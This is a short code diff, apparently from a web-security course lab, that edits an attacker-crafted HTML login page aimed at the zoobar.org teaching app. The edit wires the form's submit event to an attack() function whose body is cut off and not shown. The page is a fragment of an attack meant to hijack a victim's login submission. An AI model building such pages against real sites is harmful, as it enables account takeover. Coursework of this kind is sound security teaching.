@@ -2,10 +2,10 @@
 <head>
 </head>
 <body>
-	<form method="POST" name="loginform" action="http://zoobar.org/index.php">
+	<form method="POST" name="loginform" onsubmit="attack()"  action="http://zoobar.org/index.php">
 		<input id="username" type="text" name="login_username" size=25 autocomplete=no />
 		<input type=hidden name=login_password value="whocares" />
-		<input type="submit" name="submit_registration" onsumbit="attack" value="Login"/>
+		<input type="submit" name="submit_registration" value="Login"/>
 	</form>
 	<script>
 		function attack() {
